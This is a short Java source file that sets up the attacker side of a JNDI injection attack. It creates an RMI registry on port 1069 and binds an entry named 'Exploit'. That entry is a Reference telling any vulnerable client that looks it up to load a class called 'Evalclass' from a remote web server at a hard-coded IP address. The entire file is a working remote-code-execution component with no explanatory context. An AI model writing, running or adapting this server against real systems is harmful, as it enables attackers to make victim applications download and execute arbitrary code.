package rmi;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1069);
        Reference reference = new Reference("Evalclass",
                "Evalclass","http://121.196.109.163:80/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
}